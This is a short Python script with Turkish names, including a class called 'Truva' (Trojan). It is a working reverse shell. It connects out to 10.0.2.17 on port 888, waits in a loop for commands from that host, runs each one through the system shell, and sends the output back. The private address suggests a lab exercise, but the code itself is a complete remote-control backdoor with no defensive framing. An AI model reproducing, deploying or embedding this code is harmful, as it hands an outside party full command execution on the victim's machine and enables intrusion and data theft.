import socket
import subprocess

class Truva:

    def __init__(self,ip,port):
        self.baglanti = socket.socket(socket.AF_INET,socket.SOCK_STREAM)  #AF_INET6 SOCK_STREAM(tcp) SOCK_DGREAM(udp)

        self.baglanti.connect((ip,port))      #ip adresimiz ve port numarası


    def komut_isleme(self,komut):
        return subprocess.check_output(komut, shell=True)


    def baslatma(self):
        while True:
            komut = self.baglanti.recv(1024).decode("utf-8")
            veri = self.komut_isleme(komut)
            self.baglanti.send(veri)

        self.baglanti.close()


baglanti_kurma = Truva("10.0.2.17",888)
baglanti_kurma.baslatma()

